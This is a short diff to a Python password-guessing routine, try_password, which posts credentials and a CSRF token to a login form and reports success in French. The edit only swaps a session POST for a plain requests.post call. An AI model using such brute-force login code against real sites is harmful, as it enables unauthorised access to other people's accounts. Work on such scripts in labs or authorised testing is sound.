@@ -30,7 +30,8 @@ def try_password(password):
     headers = {
         'X-CSRFToken': csrf_token,
     }
-    response = session.post(url, data=data, headers=headers)
+    #response = session.post(url, data=data, headers=headers)
+    response = requests.post(url, data=data,headers=headers)
     if "Login successful!" in response.text:
         print(f"Connexion réussie avec : {username} / {password}")
         return True
